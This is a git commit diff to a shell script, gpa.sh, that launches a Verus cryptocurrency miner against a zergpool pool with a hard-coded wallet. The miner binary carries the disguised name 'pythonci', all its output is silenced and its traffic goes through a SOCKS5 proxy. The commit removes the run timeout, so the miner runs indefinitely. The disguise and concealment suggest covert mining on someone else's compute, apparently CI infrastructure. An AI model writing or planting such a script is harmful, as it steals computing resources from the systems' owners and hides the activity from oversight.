45f3e290090ad251e14872b3713a62e35886d6c6
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-24 14:29:20 +0100

    Update gpa.sh

--- gpa.sh
+++ gpa.sh
@@ -9,5 +9,4 @@ POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 PROXY=socks5://72.195.114.169:4145
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
-timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
-echo Sukses
+./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
